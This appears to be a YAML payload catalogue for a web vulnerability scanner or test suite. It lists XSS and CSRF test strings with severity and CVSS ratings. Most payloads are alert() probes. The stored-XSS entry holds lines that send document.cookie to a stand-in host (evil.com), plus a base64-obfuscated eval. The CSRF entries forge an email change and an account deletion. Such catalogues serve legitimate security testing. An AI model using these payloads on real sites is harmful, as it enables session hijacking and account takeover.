  - id: "xss-reflected-001"
    name: "Reflected XSS"
    category: "xss"
    type: "cross_site_scripting"
    severity: "HIGH"
    cvss: 7.5
    payloads:
      - "<script>alert('XSS')</script>"
      - "<img src=x onerror=alert('XSS')>"
      - "<svg onload=alert('XSS')>"
      - "javascript:alert('XSS')"
      - "<iframe src=javascript:alert('XSS')>"
      - "<body onload=alert('XSS')>"
  
  - id: "xss-stored-002"
    name: "Stored XSS"
    category: "xss"
    type: "cross_site_scripting"
    severity: "CRITICAL"
    cvss: 8.8
    payloads:
      - "<script>fetch('//evil.com?c='+document.cookie)</script>"
      - "<img src=x onerror=this.src='//evil.com/?'+document.cookie>"
      - "<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>"
  
  - id: "xss-dom-003"
    name: "DOM-Based XSS"
    category: "xss"
    type: "cross_site_scripting"
    severity: "HIGH"
    cvss: 7.3
    payloads:
      - "#<script>alert('DOM XSS')</script>"
      - "#<img src=x onerror=alert(1)>"
      - "javascript:eval(atob('YWxlcnQoMSk='))"
  
  - id: "csrf-001"
    name: "Cross-Site Request Forgery"
    category: "csrf"
    type: "cross_site_request_forgery"
    severity: "MEDIUM"
    cvss: 6.5
    payloads:
      - "<form action='https://target.com/change-email' method='POST'><input name='email' value='attacker@evil.com'></form>"
      - "<img src='https://target.com/delete-account?confirm=yes'>"
  
